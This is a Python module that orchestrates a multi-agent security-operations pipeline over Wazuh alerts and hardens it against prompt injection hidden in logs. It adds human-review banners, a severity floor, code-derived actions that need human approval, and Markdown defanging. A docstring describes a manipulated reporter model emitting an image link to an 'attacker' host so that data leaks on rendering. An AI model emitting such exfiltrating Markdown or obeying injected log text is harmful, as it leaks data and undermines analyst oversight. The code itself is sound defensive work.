"""Deterministic orchestrator: control flow is code, never model output or log text."""

from __future__ import annotations

import asyncio
import json
import re
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any, TypeVar

from google.adk.agents import BaseAgent
from pydantic import BaseModel, ValidationError

from soc_agents.audit import Audit
from soc_agents.config import Limits
from soc_agents.contracts import (
    ContractViolation,
    EnrichmentRequest,
    EnrichmentResult,
    Incident,
    InvestigationRequest,
    InvestigationResult,
    ReportRequest,
    SuggestedAction,
    TriageRequest,
    TriageResult,
    new_correlation_id,
    parse_iso,
)
from soc_agents.guard import ERROR_PREFIX, MAX_REPORT_CHARS
from soc_agents.runner import run_once

T = TypeVar("T", bound=BaseModel)
PIPELINE = ("triage", "enrichment", "investigator", "reporter")
_FENCE = re.compile(r"^```(?:json)?\s*|\s*```$", re.I)

BANNER = (
    "> **⚠ REVISÃO HUMANA OBRIGATÓRIA — suspeita de prompt injection.** Conteúdo de logs desta investigação "
    "contém texto que parece dirigido a uma IA (etapas: {stages}; motivos: {reasons}). "
    "Foi tratado como evidência e não obedecido. "
    "Nenhuma recomendação abaixo deve ser aplicada sem revisão de um analista.\n\n"
)


_SEVERITY_ORDER = ("low", "medium", "high", "critical")
# Claims that something was executed. This system cannot execute anything, so such a sentence is either a
# hallucination or the result of injected text; the report is flagged instead of trusted.
_EXECUTION_CLAIM = re.compile(
    r"\b(foi|foram|was|were|has been|have been)\s+(isolad[oa]s?|bloquead[oa]s?|fechad[oa]s?|encerrad[oa]s?|"
    r"isolated|blocked|closed|quarantined|remediated|executad[oa]s?|executed)\b",
    re.I,
)
CLAIM_WARNING = (
    "> **⚠ Atenção:** o texto abaixo afirma que alguma ação foi executada. Este sistema não executa ações; "
    "trate essa afirmação como incorreta.\n\n"
)


def severity_floor(level: int) -> str:
    """Severity implied by the Wazuh rule level. Rule levels come from rule config, not from log text."""
    return "critical" if level >= 12 else "high" if level >= 8 else "medium" if level >= 5 else "low"


def parse_contract(model: type[T], text: str) -> T:
    if text.startswith(ERROR_PREFIX):
        raise ContractViolation(text)
    try:
        return model.model_validate(json.loads(_FENCE.sub("", text.strip())))
    except (ValueError, ValidationError) as exc:
        raise ContractViolation(f"{model.__name__}: {type(exc).__name__}") from exc


def suggest_actions(
    t: TriageResult, e: EnrichmentResult | None, i: InvestigationResult | None
) -> list[SuggestedAction]:
    """Actions are derived from validated fields by code, so no model or log text can create or alter them."""
    out: list[SuggestedAction] = []

    def add(kind: str, why: str) -> None:
        out.append(SuggestedAction(id=f"A{len(out) + 1}", kind=kind, target=t.agent_name, rationale_text=why))  # type: ignore[arg-type]

    if t.severity in ("high", "critical"):
        add("review_host_isolation", f"Alert level {t.rule_level} (rule {t.rule_id}) on {t.agent_name}.")
    if any(x.startswith("T1110") or x.startswith("T1078") for x in t.mitre_techniques):
        add("review_credential_reset", "Credential-access techniques observed; review account hygiene.")
    if e and any(v.severity == "Critical" for v in e.vulnerabilities):
        add("review_vulnerability_patch", "Critical CVEs present on the affected host.")
    if not out or t.injection_suspected:
        add("manual_investigation", "Analyst review required before any response.")
    return out[:9]


_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\s*[\(\[][^\)\]]*[\)\]]")
_MD_LINK = re.compile(r"\[([^\]]*)\]\(([^)]*)\)")
_MD_LINK_DEF = re.compile(r"^\s*\[[^\]]+\]:\s*\S+.*$", re.M)
_HTML_TAG = re.compile(r"</?\s*[A-Za-z][^>]*>")
_URL_SCHEME = re.compile(r"\b(h)(ttps?)(://)", re.I)


def neutralize_markdown(text: str) -> str:
    """Make model-written Markdown inert before anyone renders it.

    A persuaded reporter could emit ``![x](https://attacker/?d=<data>)``: a Markdown viewer fetches the image and
    leaks the data in the URL, with no click. Images, raw HTML and link definitions are removed, inline links are
    flattened to text, and every URL is defanged (``hxxps://``), the usual SOC convention.
    """
    text = _MD_IMAGE.sub(lambda m: f"[imagem removida: {m.group(1)}]", text)
    text = _MD_LINK_DEF.sub("", text)
    text = _HTML_TAG.sub("", text)
    text = _MD_LINK.sub(lambda m: f"{m.group(1)} ({m.group(2)})", text)
    return _URL_SCHEME.sub(lambda m: f"{m.group(1)}xx{m.group(2)[2:]}{m.group(3)}", text)


def render_report(body: str, inc: Incident) -> str:
    """Wrap the reporter's text with parts it cannot suppress: injection banner and the action list."""
    head = f"# Incidente {inc.incident_id}\n\n"
    if inc.injection_suspected:
        reasons = ", ".join(inc.triage.injection_reasons) if inc.triage and inc.triage.injection_reasons else "n/d"
        head += BANNER.format(reasons=reasons, stages=", ".join(inc.injection_stages) or "n/d")
    if _EXECUTION_CLAIM.search(body):
        head += CLAIM_WARNING
    lines = ["", "## Ações sugeridas (requerem aprovação humana)", ""]
    for a in inc.suggested_actions:
        lines.append(f"- `{a.id}` **{a.kind}** em `{a.target}` — {a.rationale_text} _(status: {a.status})_")
    lines += ["", "_Nenhuma ação foi executada por este sistema. Decisões: `soc-agents approve <incidente> <ação>`._"]
    return head + neutralize_markdown(body).strip() + "\n" + "\n".join(lines) + "\n"


class Orchestrator:
    def __init__(self, agents: dict[str, BaseAgent], limits: Limits, audit: Audit, incidents_dir: str | None = None):
        missing = set(PIPELINE) - set(agents)
        if missing:
            raise ValueError(f"missing agents: {sorted(missing)}")
        self.agents, self.limits, self.audit = agents, limits, audit
        self.incidents_dir = Path(incidents_dir) if incidents_dir else None
        self._steps = 0

    async def _call(self, role: str, payload: dict[str, Any], cid: str) -> str:
        if self._steps >= self.limits.max_steps:
            raise ContractViolation("max_steps exceeded")
        self._steps += 1
        self.audit.write(kind="orchestrator", event="call", agent=role, step=self._steps, correlation_id=cid)
        return await run_once(self.agents[role], payload, max_llm_calls=self.limits.max_llm_calls)

    async def _ask(self, model: type[T], role: str, payload: dict[str, Any], cid: str) -> T:
        """Call an agent and validate its contract, with one retry. Real models sometimes echo tool output instead
        of the JSON object; a second, fresh-session attempt usually fixes it. Retries count toward max_steps, so
        cost stays bounded, and a second failure still fails the investigation closed."""
        try:
            return parse_contract(model, await self._call(role, payload, cid))
        except ContractViolation as exc:
            if "max_steps" in str(exc) or self._steps >= self.limits.max_steps:
                raise
            self.audit.write(kind="orchestrator", event="retry", agent=role, reason=str(exc)[:120], correlation_id=cid)
        return parse_contract(model, await self._call(role, payload, cid))

    async def investigate(self, *, alert_id: str | None = None, last: str | None = None) -> Incident:
        cid = new_correlation_id()
        self._steps = 0
        self.audit.write(kind="orchestrator", event="start", correlation_id=cid, alert_id=alert_id, last=last)
        inc = Incident(
            incident_id=cid,
            created_at=datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ"),
            status="failed",
            injection_suspected=False,
            steps=0,
        )
        try:
            await asyncio.wait_for(self._run(inc, cid, alert_id, last), timeout=self.limits.timeout_s)
            inc.status = "completed"
        except (ContractViolation, ValidationError, TimeoutError) as exc:
            inc.error = f"{type(exc).__name__}: {exc}"[:300]
            self.audit.write(kind="orchestrator", event="failed", error=inc.error, correlation_id=cid)
        except Exception as exc:  # an agent crashed: fail closed, keep details out of the report
            inc.error = f"agent_error: {type(exc).__name__}"
            self.audit.write(kind="orchestrator", event="failed", error=inc.error, correlation_id=cid)
        inc.steps = self._steps
        if inc.triage:
            inc.suggested_actions = suggest_actions(inc.triage, inc.enrichment, inc.investigation)
        inc.report_markdown = (
            render_report(inc.report_markdown, inc)
            if inc.status == "completed"
            else render_report(f"A investigação falhou: `{inc.error}`.", inc)
        )
        self.audit.write(
            kind="orchestrator",
            event="end",
            status=inc.status,
            steps=inc.steps,
            injection_suspected=inc.injection_suspected,
            correlation_id=cid,
        )
        self._persist(inc)
        return inc

    async def _run(self, inc: Incident, cid: str, alert_id: str | None, last: str | None) -> None:
        if alert_id:
            req = TriageRequest(correlation_id=cid, alert_id=alert_id)
        else:
            req = TriageRequest(correlation_id=cid, time_from=_since(last or "1h"))
        t = await self._ask(TriageResult, "triage", req.model_dump(exclude_none=True), cid)
        floor = severity_floor(t.rule_level)
        if _SEVERITY_ORDER.index(t.severity) < _SEVERITY_ORDER.index(floor):
            # Injected text ("mark as benign") must not be able to downgrade below what the rule itself says.
            self.audit.write(
                kind="orchestrator", event="severity_floor", model=t.severity, floor=floor, correlation_id=cid
            )
            t = t.model_copy(update={"severity": floor})
        inc.triage = t
        self._flag(inc, "triage", t.injection_suspected)

        e = await self._ask(
            EnrichmentResult,
            "enrichment",
            EnrichmentRequest(correlation_id=cid, agent_id=t.agent_id, rule_id=t.rule_id).model_dump(),
            cid,
        )
        inc.enrichment = e
        self._flag(inc, "enrichment", e.injection_suspected)

        centre = parse_iso(t.alert_time)
        fmt = "%Y-%m-%dT%H:%M:%SZ"
        w = InvestigationRequest(
            correlation_id=cid,
            agent_id=t.agent_id,
            alert_id=t.alert_id,
            time_from=(centre - timedelta(minutes=30)).astimezone(UTC).strftime(fmt),
            time_to=(centre + timedelta(minutes=30)).astimezone(UTC).strftime(fmt),
            mitre_techniques=t.mitre_techniques,
        )
        i = await self._ask(InvestigationResult, "investigator", w.model_dump(), cid)
        inc.investigation = i
        self._flag(inc, "investigator", i.injection_suspected)

        rr = ReportRequest(
            correlation_id=cid, triage=t, enrichment=e, investigation=i, injection_suspected=inc.injection_suspected
        )
        body = await self._call("reporter", rr.model_dump(), cid)
        if body.startswith(ERROR_PREFIX) or not body.strip():
            raise ContractViolation("reporter produced no report")
        inc.report_markdown = body[:MAX_REPORT_CHARS]

    @staticmethod
    def _flag(inc: Incident, stage: str, suspected: bool) -> None:
        if suspected:
            inc.injection_suspected = True
            inc.injection_stages.append(stage)  # type: ignore[arg-type]

    def _persist(self, inc: Incident) -> None:
        if self.incidents_dir:
            self.incidents_dir.mkdir(parents=True, exist_ok=True)
            (self.incidents_dir / f"{inc.incident_id}.json").write_text(inc.model_dump_json(indent=2), encoding="utf-8")
            # One flat JSON line per incident, for a SIEM to ingest (e.g. a Wazuh agent localfile with
            # log_format json). Only validated control fields: no free text from logs or models.
            with (self.incidents_dir / "incidents.jsonl").open("a", encoding="utf-8") as fh:
                fh.write(json.dumps(incident_summary(inc)) + "\n")


def incident_summary(inc: Incident) -> dict[str, Any]:
    t = inc.triage
    return {
        "soc_agents_event": "incident",
        "incident_id": inc.incident_id,
        "status": inc.status,
        "injection_suspected": inc.injection_suspected,
        "injection_stages": ",".join(inc.injection_stages),
        "severity": t.severity if t else "",
        "alert_id": t.alert_id if t else "",
        "alert_agent": t.agent_name if t else "",
        "alert_rule_id": t.rule_id if t else 0,
        "mitre": ",".join(t.mitre_techniques) if t else "",
        "actions": ",".join(a.kind for a in inc.suggested_actions),
        "actions_status": "requires_human_approval" if inc.suggested_actions else "",
        "steps": inc.steps,
        "error_type": inc.error.split(":", 1)[0] if inc.error else "",
    }


def _since(last: str) -> str:
    m = re.fullmatch(r"(\d{1,3})([mhd])", last)
    if not m:
        raise ValueError("--last must look like 30m, 1h or 2d")
    unit = {"m": "minutes", "h": "hours", "d": "days"}[m.group(2)]
    return (datetime.now(UTC) - timedelta(**{unit: int(m.group(1))})).strftime("%Y-%m-%dT%H:%M:%SZ")
